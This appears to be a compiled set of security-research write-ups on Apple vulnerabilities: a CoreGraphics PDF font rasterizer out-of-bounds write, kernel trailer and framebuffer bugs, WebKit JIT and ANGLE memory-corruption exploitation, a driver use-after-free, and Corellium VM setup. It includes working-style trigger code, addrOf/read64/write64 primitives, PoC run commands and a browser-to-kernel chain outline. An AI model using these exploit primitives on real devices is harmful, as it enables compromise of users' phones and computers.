title: HT: Scope (coregraphics-pdf-truetype-glyph-rasterizer-oob-write)
text: ## Scope CVE-2026-86950 is a useful example of turning a **numeric conversion inconsistency** into memory corruption in a scanline rasterizer. Apple describes it as a CoreGraphics out-of-bounds write reachable while processing a crafted file and states that it may have been used against targeted individuals. The public research and PoC demonstrate a crash and a controlled out-of-bounds update on macOS and iOS, but not reliable code execution, sandbox escape or privilege escalation.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup> The delivery object is a PDF with an embedded TrueType font. ImageIO thumbnail generation parses the PDF, renders its text and reaches the shared CoreGraphics glyph path. This makes document previews an important parser surface even when the receiving application does not explicitly expose a font-rendering feature.<sup>[[2]](#references)[[3]](#references)</sup> For messaging delivery and automatic-preview analysis, see [Zero-click Messaging → Image Parser Chains](../../mobile-pentesting/ios-pentesting/zero-click-messaging-image-parser-chains.md).

title: HT: Finding the primitive by patch diffing (coregraphics-pdf-truetype-glyph-rasterizer-oob-write)
text: ## Finding the primitive by patch diffing The iOS 26.7 to 26.7.1 `ipsw-diffs` report localizes all CoreGraphics changes to eight `aa_*` functions: `aa_moveto`, `aa_close`, `aa_lineto`, `aa_cubeto`, `aa_clip_edge`, `aa_quadto`, `aa_clipping` and `aa_rectat`. Repeated instruction-level changes in these callers reveal an inlined floating-point-to-fixed-point conversion rather than eight unrelated defects.<sup>[[2]](#references)[[4]](#references)</sup> The vulnerable helper effectively performed an unchecked cast. CoreGraphics represents each device pixel with 4096 fixed-point sub-pixel units, so a device coordinate slightly beyond roughly `2^19` pixels already pushes the scaled value outside the signed 32-bit domain.<sup>[[2]](#references)</sup> ```c static inline int32_t aa_double_to_fixed(double px) { double v = 0.5 + 4096.0 * px; return (int32_t)v; } ``` Converting a finite `double` outside the `int32_t` range is undefined in C. The fix handles NaN and clamps the scaled result before casting. The patched helper uses the symmetric limit `0x3ffff001`, keeping every caller inside a defined conversion domain.<sup>[[2]](#references)</sup> ```c if (isnan(v)) return 0; if (v < -1073737729.0) return -1073737729; if (v > 1073737729.0) return 1073737729; return (int32_t)v; ```

title: HT: Reaching an unclipped rasterizer (coregraphics-pdf-truetype-glyph-rasterizer-oob-write)
text: ## Reaching an unclipped rasterizer Do not stop after identifying the bad cast. First find a context creation path that does not constrain device coordinates. The analyzed build had two `aa_create()` callers:<sup>[[2]](#references)</sup> - `ripr_Acquire` sets the clipping flags and initializes a device-coordinate clipping rectangle with `aa_clipping`. - `CGGlyphBitmapCreateWithPathAndDilation` leaves those flags clear and does not install that device clipping rectangle. The second route is therefore the useful one. A glyph outline supplies `MoveTo`, `LineTo`, `QuadTo`, `CurveTo` and `Close` elements. CoreGraphics transforms each point, dispatches it to the corresponding `aa_*` routine, records fixed-point edges with `aa_add_edges`, then builds the alpha mask in `aa_cache_render`:<sup>[[2]](#references)</sup> ```text PDF text / CG glyph draw -> CGGlyphBitmapCreateWithPathAndDilation -> CGPathApply -> aa_moveto / aa_lineto / aa_quadto / aa_cubeto -> aa_add_edges # edge records + bbox -> aa_cache_render # coverage buffer writes ```

title: HT: Conversion disagreement to undersized allocation (coregraphics-pdf-truetype-glyph-rasterizer-oob-write)
text: ## Conversion disagreement to undersized allocation The undefined cast compiled differently after inlining at two call sites on ARM64:<sup>[[2]](#references)</sup> | Caller | Conversion sequence | Out-of-range result | | --- | --- | --- | | `aa_moveto` | `FCVTZS Wd, Dn` | saturates toward `INT32_MIN`/`INT32_MAX` | | `aa_lineto` | `FCVTZS Vd.2D, Vn.2D`, then `XTN` | converts through 64-bit lanes, then retains the low 32 bits | Consequently, the start and end of one logical edge can encode incompatible fixed-point values. `aa_add_edges` computes `int32_t dx = new_x - cur_x` and uses the sign of `dx` to decide which endpoint is the minimum and maximum. If that subtraction wraps, it selects the wrong comparisons and the recorded bounding box can exclude the real edge coordinate.<sup>[[2]](#references)</sup> `aa_cache_render` sizes a per-scanline coverage array from that corrupted box.<sup>[[2]](#references)</sup> ```c width_px = (bbox_max_x - bbox_min_x) / 4096; coverage = width_px > 1015 ? malloc(4 * (width_px + 16)) : alloca(4 * (width_px + 16)); ``` The edge walker still uses the actual edge positions, so alpha accumulation runs beyond the undersized array. The public analysis characterizes the useful primitive as a controlled-offset 16-bit increment affecting two adjacent 16-bit values. The path width also selects the allocation class: a recorded width at most 1015 uses the stack, while a larger width uses the heap.<sup>[[2]](#references)</sup>

title: HT: Building and validating the PDF/font trigger (coregraphics-pdf-truetype-glyph-rasterizer-oob-write)
text: ## Building and validating the PDF/font trigger The public generator makes the oversized coordinate survive multiple format and renderer limits by combining PDF text scaling with nested TrueType composite glyphs. Its important constraints are:<sup>[[3]](#references)</sup> - `unitsPerEm = 16384`, PDF font size `Tf = 1024` and nine composite levels. - Each composite uses the maximum positive F2Dot14 scale, `32767 / 16384`, which is just below 2. - A leaf contour at `x = 32000` becomes approximately 16 million font units and then about one million device pixels. Multiplication by 4096 exceeds `INT32_MAX`. - A separate small rectangle controls the recorded width. In the published generator, leaf width `DX <= 31` selects the `alloca` path and `DX >= 32` selects the `malloc` path after composite scaling. - The PDF embeds the generated font as `/FontFile2` and executes `(A) Tj`, forcing the composite glyph through the PDF text renderer. Use only an isolated, disposable Apple research system at the intended vulnerable patch level. The published repository contains the generator, sample and ImageIO harness:<sup>[[3]](#references)</sup> ```bash git clone https://github.com/califio/publications.git cd publications/MADBugs/CVE-2026-86950/trigger uv pip install fonttools make lldb -- ./render trigger.pdf ``` Useful LLDB breakpoints separate reachability from corruption: ```text (lldb) breakpoint set -n CGGlyphBitmapCreateWithPathAndDilation (lldb) breakpoint set -n aa_add_edges (lldb) breakpoint set -n aa_cache_render (lldb) run ``` On a vulnerable build, the supplied harness reaches `CGImageSourceCreateThumbnailAtIndex`, then the ImageIO PDF plugin, `CGContextDrawPDFPageWithOptions`, `CGPDFTextLayoutDrawGlyphs`, glyph bitmap creation and finally the invalid access in `aa_cache_rend

title: HT: Audit and hardening takeaways (coregraphics-pdf-truetype-glyph-rasterizer-oob-write)
text: ## Audit and hardening takeaways - When diffing optimized binaries, group identical changes across inlined callers. Repeated clamps around conversions often identify the root cause faster than starting from the eventual crash. - Trace context construction and flags. An upstream clamp in one general path does not protect a specialized glyph-cache or thumbnail path created with different state. - Treat float-to-integer conversion as a trust boundary: reject NaN and infinities, clamp in the floating-point domain, and only then cast. - Calculate deltas and bounding boxes in a widened integer type. Before allocation, verify that every emitted edge index lies inside the same interval used to derive the buffer size. - Preflight PDFs before platform rendering. Recursively inspect object streams and embedded `FontFile`, `FontFile2` and `FontFile3` streams, then route malformed or unverified fonts away from automatic thumbnail generation.

title: HT: The Bug (CVE-2020-27950-mach_msg_trailer_t)
text: ## The Bug Synacktiv provides a detailed explanation of the vulnerability; the following is a concise summary.<sup>[[1]](#references)</sup> Every Mach message the kernel receives ends with a **"trailer"**: a variable-length struct with metadata (seqno, sender token, audit token, context, access control data, labels...). The kernel **always reserves the largest possible trailer** (MAX_TRAILER_SIZE) in the message buffer, but **only initializes some fields**, then later **decides which trailer size to return** based on **user-controlled receive options**. These are the trailer relevant structs: ```c typedef struct{ mach_msg_trailer_type_t msgh_trailer_type; mach_msg_trailer_size_t msgh_trailer_size; } mach_msg_trailer_t; typedef struct{ mach_msg_trailer_type_t msgh_trailer_type; mach_msg_trailer_size_t msgh_trailer_size; mach_port_seqno_t msgh_seqno; security_token_t msgh_sender; audit_token_t msgh_audit; mach_port_context_t msgh_context; int msgh_ad; msg_labels_t msgh_labels; } mach_msg_mac_trailer_t; #define MACH_MSG_TRAILER_MINIMUM_SIZE sizeof(mach_msg_trailer_t) typedef mach_msg_mac_trailer_t mach_msg_max_trailer_t; #define MAX_TRAILER_SIZE ((mach_msg_size_t)sizeof(mach_msg_max_trailer_t)) ``` When the trailer object is generated, only some fields are initialized, although space for the maximum trailer size is always reserved: ```c trailer = (mach_msg_max_trailer_t *) ((vm_offset_t)kmsg->ikm_header + size); trailer->msgh_sender = current_thread()->task->sec_token; trailer->msgh_audit = current_thread()->task->audit_token; trailer->msgh_trailer_type = MACH_MSG_TRAILER_FORMAT_0; trailer->msgh_trailer_size = MACH_MSG_TRAILER_MINIMUM_SIZE; [...] trailer->msgh_labels.sender = 0; ``` When `mach_msg()` receives a Mach message, `ipc_kmsg_add_trailer()` appends the trailer. title: HT: The Bug (CVE-2021-30807-IOMobileFrameBuffer)
text: ## The Bug Saar Amar's writeup provides the full analysis; the following is a concise summary.<sup>[[1]](#references)</sup> - The vulnerable code path is **external method #83** of the **IOMobileFramebuffer / AppleCLCD** user client: `IOMobileFramebufferUserClient::s_displayed_fb_surface(...)`. It receives a user-controlled parameter without validating it and forwards that value as **`scalar0`**. - That method forwards into **`IOMobileFramebufferLegacy::get_displayed_surface(this, task*, out_id, scalar0)`**, where **`scalar0`** (a user-controlled **32-bit** value) is used as an **index** into an internal **array of pointers** without **any bounds check**:<sup>[[4]](#references)</sup> > `ptr = *(this + 0xA58 + scalar0 * 8);` → passed to `IOSurfaceRoot::copyPortNameForSurfaceInTask(...)` as an **`IOSurface*`**.\ > **Result:** **OOB pointer read & type confusion** on that array. If the pointer isn't valid, the kernel deref panics → **DoS**. > [!NOTE] > This was fixed in **iOS/iPadOS 14.7.1**, **macOS Big Sur 11.5.1**, **watchOS 7.6.1**<sup>[[3]](#references)</sup> > [!WARNING] > The initial function to call `IOMobileFramebufferUserClient::s_displayed_fb_surface(...)` is protected by the entitlement **`com.apple.private.allow-explicit-graphics-priority`**. However, **WebKit.WebContent** has this entitlement, so it can be used to trigger the vuln from a sandboxed process.<sup>[[1]](#references)</sup>

title: HT: WebKit JavaScriptCore DFG Slow-Path Register Spill Exploitation (webkit-jsc-dfg-slow-path-register-spill)
text: # WebKit JavaScriptCore DFG Slow-Path Register Spill Exploitation {{#include ../../banners/hacktricks-training.md}} JavaScriptCore (JSC) promotes hot JavaScript through several execution tiers. The Data Flow Graph (DFG) tier speculates about types and object Structures. Failed guards transfer execution to a generic slow path or perform an OSR exit, so every live value must have the location described by the compiler's register-allocation state at that control-flow edge.<sup>[[1]](#references)[[3]](#references)</sup>

title: HT: Register allocation after a slow-path branch (webkit-jsc-dfg-slow-path-register-spill)
text: ## Register allocation after a slow-path branch A useful JIT-auditing pattern is to look for **resource allocation after emitting a branch to a slow path**. Allocating a temporary physical register can spill a live virtual register. If the spill instruction is emitted after the slow-path jump, the taken branch skips the store even though the allocator records the value as spilled. The generic operation can then clobber the physical register. Later optimized code reloads stale stack data as the original value.<sup>[[1]](#references)[[2]](#references)</sup> The vulnerable integer TypedArray store had this order: ```text convert value and emit slow-path jump allocate scratch register (possibly spill a live value) perform bounds checks and store ``` The failure required all of the following in the demonstrated JSC build:<sup>[[1]](#references)</sup> 1. A store into an integer TypedArray. 2. An array mode that may use a resizable, growable, or shared backing buffer. This causes DFG to request a second scratch GPR. 3. A JavaScript double that cannot be converted to signed `int32`, such as `0xffffffff`. This takes the generic `PutByVal` slow path. 4. Enough live values to exhaust the available GPRs, so allocating the scratch register spills one of them. The WebKit fix moved allocation of the second scratch register before `getIntTypedArrayStoreOperand()`. Any spill is therefore emitted before that function can add the slow-path branch, keeping runtime state consistent with allocator bookkeeping.<sup>[[2]](#references)</sup>

title: HT: Triaging generated DFG code (webkit-jsc-dfg-slow-path-register-spill)
text: ## Triaging generated DFG code Use a matching vulnerable `jsc` build. These flags identify the tier, correlate DFG IR with machine code, and expose debugging helpers:<sup>[[1]](#references)</sup> ```bash WebKitBuild/JSCOnly/Release/bin/jsc --logJIT=true trigger.js WebKitBuild/JSCOnly/Release/bin/jsc --dumpDFGDisassembly=true trigger.js WebKitBuild/JSCOnly/Release/bin/jsc --useDollarVM=true primitives.js ``` Work backwards from the faulting `CheckStructure` or property access:<sup>[[1]](#references)</sup> 1. Identify the stack slot reloaded as the receiver. 2. Find the earlier spill that should populate that slot. 3. Locate the preceding `PutByVal` conversion and its jump to the generic operation. 4. Break before the value load, at the slow-path jump, and after the generic call. Confirm that the live object begins in a GPR, the branch skips its spill, and the call clobbers that GPR. 5. Compare actual control flow with the virtual-register `GenerationInfo`. A slot marked as containing a boxed cell but never written on the taken edge is the exploitation primitive. On x86-64, adding an `int3` helper to a research build can make generated-code breakpoints deterministic. The JSC `describe()` builtin and `$vm.dumpCell()` are useful for validating object addresses, Structure IDs, butterflies, and element lengths.<sup>[[1]](#references)</sup>

title: HT: From stale stack data to Structure confusion (webkit-jsc-dfg-slow-path-register-spill)
text: ## From stale stack data to Structure confusion JIT stack frames are normally reused without clearing every old slot. Call a spray function immediately before the vulnerable function so both functions reuse a compatible frame. Load many attacker-selected objects into locals and consume every local in the return value; otherwise dead-code elimination may remove the spray.<sup>[[1]](#references)</sup> The next step is to separate the **Structure checked by DFG** from the **object later recovered from the stale slot**:<sup>[[1]](#references)</sup> 1. Warm up the function with receivers having an expected Structure and use a value such as `1.0` that does not take the slow path. 2. Read a receiver property before the vulnerable TypedArray store. This creates a `CheckStructure` followed by a fixed-offset property load. 3. Write another property after the store. DFG may remove this second Structure check because its model says no intervening operation can replace the receiver. 4. On the final call, spray an object with a different, smaller inline layout and use `0xffffffff` to take the slow path. The skipped spill makes the later property store consume the sprayed object while retaining the expected Structure's property offset.<sup>[[1]](#references)</sup> This is not merely a bad pointer dereference. It converts stale stack reuse into a fixed-offset type confusion. Keep the training and trigger values in an array or another runtime-controlled source so constant folding does not remove the relevant conversion and branch.<sup>[[1]](#references)</sup>

title: HT: Adjacent-object butterfly corruption (webkit-jsc-dfg-slow-path-register-spill)
text: ## Adjacent-object butterfly corruption In the demonstrated 64-bit layout, a `JSObject` begins with metadata, then a butterfly pointer, followed by inline properties. The butterfly backs indexed elements and out-of-line properties. These offsets are build-specific implementation details and must be verified against the target build.<sup>[[1]](#references)</sup> If optimized code uses an offset for a receiver with more inline properties than the sprayed receiver actually has, the property store can extend into the next allocation. Groom same-size objects so the sprayed receiver precedes a victim. Then select an expected property offset that overlaps the victim's butterfly pointer. Store a chosen object's pointer through the confused access to redirect the victim butterfly.<sup>[[1]](#references)</sup> Reliability checks for this layout include:<sup>[[1]](#references)</sup> - Allocate the receiver, victim, and carrier in a stable order and compatible allocator size class. - Give the victim and carrier floating-point elements so corrupted storage can be accessed as raw 64-bit data. - Ensure the memory interpreted as the butterfly's public length is nonzero and large enough for the indexes used. - Validate adjacency and the butterfly change with `describe()` or `$vm.dumpCell()` before building stronger primitives.

title: HT: `addrOf` and arbitrary read/write (webkit-jsc-dfg-slow-path-register-spill)
text: ## `addrOf` and arbitrary read/write Two views on one `ArrayBuffer` provide lossless conversion between a JavaScript double and its 64-bit representation:<sup>[[1]](#references)</sup> ```js const bits = new ArrayBuffer(8); const f64 = new Float64Array(bits); const u64 = new BigUint64Array(bits); function f2i(v) { f64[0] = v; return u64[0]; } function i2f(v) { u64[0] = v; return f64[0]; } ``` After the victim butterfly points into the carrier object, write an object reference into a carrier property and read the same bytes through the victim's double elements. This yields `addrOf`:<sup>[[1]](#references)</sup> ```js function addrOf(obj) { carrier.x = obj; return f2i(victim[2]); } ``` If one victim element aliases the carrier's butterfly field, temporarily replace it with the target address and access `carrier[0]`. Save and restore the original butterfly around every operation to reduce corruption and garbage-collector instability:<sup>[[1]](#references)</sup> ```js function read64(addr) { const saved = victim[1]; victim[1] = i2f(addr); const value = f2i(carrier[0]); victim[1] = saved; return value; } ``` ```js function write64(addr, value) { const saved = victim[1]; victim[1] = i2f(addr); carrier[0] = i2f(value); victim[1] = saved; } ``` Test the primitive on a sacrificial array: leak its backing storage, change one element, read it back through normal JavaScript, and restore the original value. Renderer arbitrary read/write is not automatically native code execution. On arm64e Apple targets, a separate strategy is still required for PAC and executable-memory protections such as APRR.<sup>[[1]](#references)</sup>

title: HT: iOS How to Connect to Corellium (ios-corellium)
text: # iOS How to Connect to Corellium {{#include ../../banners/hacktricks-training.md}}

title: HT: Prerequisites (ios-corellium)
text: ## Prerequisites - A Corellium iOS VM (jailbroken or not). In this guide we assume you have access to Corellium. - Local tools: **ssh/scp**. - (Optional) **SSH keys** added to your Corellium project for passwordless logins.

title: HT: Connect to the iPhone VM from localhost (ios-corellium)
text: ## Connect to the iPhone VM from localhost ### A) Quick Connect (no VPN) 0) In the web interface, open **Admin → Projects** and add your SSH public key to the project's **Authorized Keys** section (required for public-cloud Quick Connect).<sup>[[1]](#references)</sup> 1) Open the device page → **Connect** 2) **Copy the Quick Connect SSH command** shown by Corellium and paste it into your terminal. The generated command uses Corellium's proxy as an SSH jump host.<sup>[[1]](#references)</sup> 3) Authenticate to the device with the matching private key. If the target device does not contain an authorized key, Corellium's SSH flow can instead prompt for the device password.<sup>[[1]](#references)</sup> ### B) VPN → direct SSH 0) Add your SSH key to the project (recommended). 1) From the device page, select **CONNECT** → **VPN**, download the `.ovpn` profile, and use an OpenVPN client that supports TAP mode.<sup>[[2]](#references)</sup> 2) SSH to the VM’s **10.11.x.x** address: ```bash ssh root@10.11.1.1 ```

title: HT: Upload a native binary and execute it (ios-corellium)
text: ## Upload a native binary and execute it ### 2.1 **Upload** - If Quick Connect gave you a jump-host command, reuse its `-J` value: ```bash scp -J <domain> ./mytool root@10.11.1.1:/var/root/mytool ``` - If using the VPN, direct `scp` normally needs no jump host: ```bash scp ./mytool root@10.11.1.1:/var/root/mytool ```

title: HT: Upload and install an iOS app (`.ipa`) (ios-corellium)
text: ## Upload and install an iOS app (`.ipa`) ### Path A — **Web UI (fastest)** 1) Device page → **Apps** tab → **Install App** → pick your `.ipa`. 2) From the same tab you can **launch, kill, or uninstall** the app. Corellium can install properly signed IPAs on jailbroken and non-jailbroken virtual devices.<sup>[[3]](#references)</sup> ### Path B — Scripted via Corellium Agent The following is illustrative pseudocode for an Agent/SDK version that exposes `upload` and `install`; verify the method names against the SDK version available in the deployment before relying on it: ```js // Node.js (pseudo) using Corellium Agent await agent.upload("./app.ipa", "/var/tmp/app.ipa"); await agent.install("/var/tmp/app.ipa", (progress, status) => { console.log(progress, status); }); ``` ### Path C — **Non-jailbroken (proper signing / Sideloadly)** - If you don’t have a provisioning profile, use **Sideloadly** to re-sign with your Apple ID, or sign in Xcode. - You can also expose the VM to Xcode using **USBFlux** (see §5). - For quick logs and commands without SSH, use the device **Console** in the UI.<sup>[[4]](#references)</sup>

title: HT: **Extras** (ios-corellium)
text: ## **Extras** - **Port-forwarding** (make the VM feel local for other tools): ```bash

title: HT: Forward local 2222 -> device 22 (ios-corellium)
text: # Forward local 2222 -> device 22 ssh -N -L 2222:127.0.0.1:22 root@10.11.1.1

title: HT: Now you can: scp -P 2222 file root@10.11.1.1:/var/root/ (ios-corellium)
text: # Now you can: scp -P 2222 file root@10.11.1.1:/var/root/ ``` - **LLDB remote debugging**: use the **LLDB/GDB stub** address shown at the bottom of the device page (**CONNECT** → **LLDB**).<sup>[[5]](#references)</sup> - **USBFlux (macOS/Linux)**: present the VM over the standard USB/usbmux protocol so compatible tools see it like a cabled device. Corellium documents workflows for both **Xcode** and **Sideloadly**; the latter can re-sign and install an unencrypted IPA on a non-jailbroken VM.<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

title: HT: **Common pitfalls** (ios-corellium)
text: ## **Common pitfalls** - **Proper signing** is required on **non-jailbroken** devices; unsigned IPAs won’t launch. - **Quick Connect vs VPN**: Quick Connect is simplest; use **VPN** when you need the device on your local network (e.g., local proxies/tools). - **No App Store** on Corellium devices; bring your own (re)signed IPAs.

title: HT: WebKit DFG Store-Barrier UAF + ANGLE PBO OOB (iOS 26.1) (webkit-dfg-store-barrier-uaf-angle-oob)
text: # WebKit DFG Store-Barrier UAF + ANGLE PBO OOB (iOS 26.1) {{#include ../../banners/hacktricks-training.md}}

title: HT: Summary (webkit-dfg-store-barrier-uaf-angle-oob)
text: ## Summary - **DFG Store Barrier bug (CVE-2025-43529)**: In `DFGStoreBarrierInsertionPhase.cpp`, a **Phi node marked escaped while its Upsilon inputs are not** causes the phase to **skip inserting a write barrier** on subsequent object stores. Under GC pressure this lets JSC free still-reachable objects → **use-after-free**.<sup>[[1]](#references)</sup><sup>[[2]](#references)</sup> - **Exploit target**: Force a **Date** object to materialize a butterfly (e.g., `a[0] = 1.1`) so the butterfly is freed, then **reclaimed** as array element storage to build boxed/unboxed confusion → `addrof`/`fakeobj` primitives.<sup>[[1]](#references)</sup><sup>[[2]](#references)</sup> - **ANGLE Metal PBO bug (CVE-2025-14174)**: The Metal backend allocates the PBO staging buffer using `UNPACK_IMAGE_HEIGHT` instead of the real texture height. Supplying a tiny unpack height then issuing a large `texImage2D` causes a **staging-buffer OOB write** (~240KB in the PoC below).<sup>[[1]](#references)</sup> - **PAC blockers on arm64e (iOS 26.1)**: TypedArray `m_vector` and JSArray `butterfly` are PAC-signed; forging fake objects with attacker-chosen pointers crashes with `EXC_BAD_ACCESS`/`EXC_ARM_PAC`. Only reusing **already-signed** butterflies (boxed/unboxed reinterpretation) works.<sup>[[1]](#references)</sup><sup>[[2]](#references)</sup>

title: HT: Renderer-to-kernel process chain (webkit-dfg-store-barrier-uaf-angle-oob)
text: ## Renderer-to-kernel process chain A browser memory primitive is only the first boundary. Safari executes page JavaScript in the tightly sandboxed `com.apple.WebKit.WebContent` process, while WebGL work is decoded in the more privileged `com.apple.WebKit.GPU` process. DarkSword composed the following reusable sequence; the final two bugs are included only to show why each intermediate primitive was needed.<sup>[[3]](#references)[[4]](#references)</sup> ```text landing page -> hidden iframe -> rce_loader.js -> JSC DFG confusion/UAF -> addrof + fakeobj -> WebContent arbitrary R/W -> dyld PAC bypass -> authenticated native calls -> ANGLE/WebGL OOB -> code execution in the GPU process -> XNU copy-on-write bug -> native calls in mediaplaybackd -> XNU VFS race -> physical and virtual kernel R/W ``` The important selection rule for multi-process chains is **reachability plus privilege gain**: compromise an IPC endpoint the current sandbox may contact, then move into a process with additional filesystem, Mach-service, entitlement, or kernel-facing attack surface. In this chain WebContent can submit graphics commands to the GPU process; the GPU process can reach surfaces used to pivot into `mediaplaybackd`, where the final kernel stage is run.<sup>[[3]](#references)[[4]](#references)</sup> ### Version-gated staged delivery The loader fingerprinted the iOS version, fetched the matching JSC worker and downloaded later stages only after the preceding primitive succeeded. The 18.4 exploit split work between a main-context module and a Web Worker communicating with `postMessage`, whereas the 18.6/18.7 implementation placed the exploit in the worker and used a placeholder main module. Per-build workers and offset tables are necessary because JSC structure IDs, object layouts, signed-

title: HT: Triggering the DFG missing barrier → UAF (webkit-dfg-store-barrier-uaf-angle-oob)
text: ## Triggering the DFG missing barrier → UAF ```js function triggerUAF(flag, allocCount) { const A = {p0: 0x41414141, p1: 1.1, p2: 2.2}; arr[arr_index] = A; // Tenure A in old space const a = new Date(1111); a[0] = 1.1; // Force Date butterfly // GC pressure for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000)); const b = {p0: 0x42424242, p1: 1.1}; let f = b; if (flag) f = 1.1; // Phi escapes, Upsilon not escaped A.p1 = f; // Missing barrier state set up for (let i = 0; i < 1e6; ++i) {} // GC race window b.p1 = a; // Store without barrier → frees `a`/butterfly } ``` Key points: - Place **A** in old space to exercise generational barriers. - Create an indexed **Date** so the **butterfly** is the freed target. - Spray `ArrayBuffer(0x800000)` to force GC and widen the race. - The Phi/Upsilon escape mismatch stops barrier insertion; `b.p1 = a` runs **without a write barrier**, so GC reclaims `a`/butterfly.

title: HT: Butterfly reclaim → boxed/unboxed confusion (webkit-dfg-store-barrier-uaf-angle-oob)
text: ## Butterfly reclaim → boxed/unboxed confusion After GC frees the Date butterfly, spray arrays so the freed slab is reused as elements for two arrays with different element kinds:<sup>[[1]](#references)</sup><sup>[[2]](#references)</sup> ```js boxed_arr[0] = obj; // store as boxed pointer const addr = ftoi(unboxed_arr[0]); // read as float64 → addr leak unboxed_arr[0] = itof(addr); // write pointer bits as float const fake = boxed_arr[0]; // reinterpret as object → fakeobj ``` Status on **iOS 26.1 (arm64e)**: - **Working:** `addrof`, `fakeobj`, 20+ address leaks per run, inline-slot read/write (on known inline fields). - **Not stable yet:** generalized `read64`/`write64` via inline-slot backings.

title: HT: PAC constraints on arm64e (why fake objects crash) (webkit-dfg-store-barrier-uaf-angle-oob)
text: ## PAC constraints on arm64e (why fake objects crash) - **TypedArray `m_vector`** and **JSArray `butterfly`** are PAC-signed; forging pointers yields `EXC_BAD_ACCESS` / likely `EXC_ARM_PAC`.<sup>[[1]](#references)</sup><sup>[[2]](#references)</sup> - The confusion primitive works because it **reuses legitimate signed butterflies**; introducing unsigned attacker pointers fails authentication. - Potential bypass ideas noted: JIT paths that skip auth, gadgets that sign attacker pointers, or pivoting through the ANGLE OOB. ### Legitimate pointer signer as a PAC oracle Arbitrary write cannot directly forge an arm64e call target because its PAC binds the pointer to a secret key and a modifier. A general bypass pattern is therefore to corrupt the inputs or state of code that must legitimately sign pointers—such as dyld while resolving bindings—and turn it into a **signing oracle**. The reported CVE-2026-20700 stage applied this pattern to dyld, converting WebContent arbitrary R/W into authenticated native function calls; the complete oracle primitive has not been publicly described.<sup>[[3]](#references)[[4]](#references)</sup> Conceptually, exploitation asks the trusted signer for an authenticated attacker-selected target, places the result in a callback or other authenticated indirect-call slot, and reaches the consuming callsite. The CPU then accepts the pointer without disclosure of the PAC key and without mapping attacker-supplied executable pages.<sup>[[4]](#references)</sup> ### JavaScript-only post-exploitation runtime DarkSword kept the orchestration, later exploit stages and final payloads in JavaScript. Recovered build paths show separate abstractions for raw memory/native calls (`Chain/Native.js`), per-version offsets (`Chain/OffsetsStruct.js`), PAC and remote cal

title: HT: ANGLE Metal PBO under-allocation → OOB write (webkit-dfg-store-barrier-uaf-angle-oob)
text: ## ANGLE Metal PBO under-allocation → OOB write A WebGL request crosses several trust boundaries: the WebContent binding serializes renderer-controlled arguments, the GPU-process IPC decoder reconstructs them, ANGLE validates/translates them, and the Metal backend submits the operation. Audit sizes, offsets, indices, formats, dimensions and overflow-safe arithmetic at **every** layer; disagreement between frontend validation and backend allocation can turn a JavaScript call into GPU-process corruption and therefore a sandbox escape.<sup>[[3]](#references)[[4]](#references)</sup> Use a tiny unpack height to shrink the staging buffer, then upload a large texture so the copy overruns:<sup>[[1]](#references)</sup> ```js gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, 16); // alloc height // staging = 256 * 16 * 4 = 16KB // actual = 256 * 256 * 4 = 256KB → ~240KB OOB gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT32F, 256, 256, 0, gl.DEPTH_COMPONENT, gl.FLOAT, 0); ``` Notes: - Bug in `TextureMtl.cpp`: staging buffer uses `UNPACK_IMAGE_HEIGHT` instead of real texture height on the PBO path.<sup>[[1]](#references)</sup> - In the reference probe the WebGL2 PBO trigger is plumbed but not yet reliably observed on iOS 26.1.

title: HT: iOS Driver Embedded Queue-Node UAF (CVE-2026-20687) (ios-driver-embedded-queue-node-uaf)
text: # iOS Driver Embedded Queue-Node UAF (CVE-2026-20687) {{#include ../../banners/hacktricks-training.md}}

title: HT: Vulnerability pattern (ios-driver-embedded-queue-node-uaf)
text: ## Vulnerability pattern A driver can enqueue an **intrusive node embedded inside an owning request** instead of a pointer to the start of the allocation. This is safe only while the queue and the request share the same lifetime. If timeout or client-close cleanup frees the owner without unlinking every embedded node, the queue keeps a pointer into freed memory.<sup>[[2]](#references)[[3]](#references)</sup> `AppleJPEGDriver` illustrates the pattern with a `JpegRequest` allocation of approximately `0x440` bytes. Its per-codec vector stores the embedded node at `request + 0x78`. A later walk loads a field at `node + 0x8`, which is really `request + 0x80`. The public PoC identifies this as the first stale read reached from `finish_io_gated()` through `fullSpeedRequestExist()`.<sup>[[2]](#references)[[3]](#references)</sup> ```text request allocation +0x00 request fields ... +0x78 embedded queue node <--- vector stores this address +0x80 owner/self pointer <--- later vector walk reads this ... +0x440 end of allocation ``` The important audit invariant is therefore not just "the request was freed once." Every exit after enqueue must either remove the node before releasing the owner or transfer ownership to an object that outlives the queue entry.<sup>[[2]](#references)[[3]](#references)</sup>

title: HT: Deferred asynchronous-to-synchronous trigger (ios-driver-embedded-queue-node-uaf)
text: ## Deferred asynchronous-to-synchronous trigger The PoC first creates large source and destination `IOSurface` objects, calls decode selector `1` with a `0x58`-byte request, sets a non-zero `asyncToken`, and submits several requests per connection. It then closes each user-client connection while hardware work can still be in flight. The source describes a teardown race in which `terminatePhase1` marks the client inactive outside the command gate while completion cleanup later observes that state.<sup>[[3]](#references)</sup> The repository's trigger description models the later failure as follows: `queue_io_gated()` appends `request + 0x78`; a synchronous decode waits for 10 seconds; timeout cleanup frees the request but does not dequeue the embedded node; and a later `finish_io_gated()` walk dereferences the stale entry. Opening Camera supplies the synchronous JPEG operation on the tested build, which explains why the panic is deferred until after the priming application has finished its work.<sup>[[2]](#references)</sup> ```text submit async decodes -> close connection with work in flight -> stale internal state remains open Camera -> synchronous decode -> 10 s timeout -> free(request), node still in vector later completion -> walk vector -> read *(node + 0x8) ``` This split trigger is useful when reproducing driver bugs: exercise one client to create stale state, destroy that client, and use a normal system feature to drive a different completion or timeout path. Do not assume the operation visible at the crash site created the dangling pointer.<sup>[[2]](#references)</sup>

title: HT: Interpreting the MTE panic (ios-driver-embedded-queue-node-uaf)
